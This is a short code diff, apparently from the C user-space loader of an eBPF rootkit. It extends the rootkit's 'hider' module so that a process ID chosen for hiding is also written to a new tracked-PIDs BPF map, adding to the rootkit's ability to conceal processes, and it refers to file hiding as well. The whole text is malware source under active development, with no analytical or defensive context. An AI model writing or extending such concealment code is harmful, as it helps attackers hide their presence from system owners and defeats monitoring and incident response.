@@ -12,11 +12,13 @@ static struct {
     struct rootkit *skel;
     int hide_names_map_fd;
     int hide_bpf_map_fd;
+    int tracked_pids_map_fd;
     bool is_initialized;
 } g_hider = {
     .skel = NULL,
     .hide_names_map_fd = -1,
     .hide_bpf_map_fd = -1,
+    .tracked_pids_map_fd = -1,
     .is_initialized = false,
 };
 
@@ -142,6 +144,10 @@ int hider_init(struct rootkit *skel)
     if (g_hider.hide_bpf_map_fd < 0)
         return -EINVAL;
 
+    g_hider.tracked_pids_map_fd = bpf_map__fd(skel->maps.tracked_pids_map);
+    if (g_hider.tracked_pids_map_fd < 0)
+        return -EINVAL;
+
     g_hider.is_initialized = true;
     return 0;
 }
@@ -151,10 +157,16 @@ int hider_hide_pid(pid_t pid)
     if (pid <= 0)
         return -EINVAL;
 
+    int ret = 0;
+
     char pid_str[MAX_NAME_LEN] = { 0 };
     snprintf(pid_str, sizeof(pid_str), "%d", pid);
 
-    return update_string_map(g_hider.hide_names_map_fd, pid_str);
+    ret = update_string_map(g_hider.hide_names_map_fd, pid_str);
+    if (ret)
+        return ret;
+
+    return update_uint32_map(g_hider.tracked_pids_map_fd, (uint32_t)pid);
 }
 
 int hider_hide_file(const char *filename)
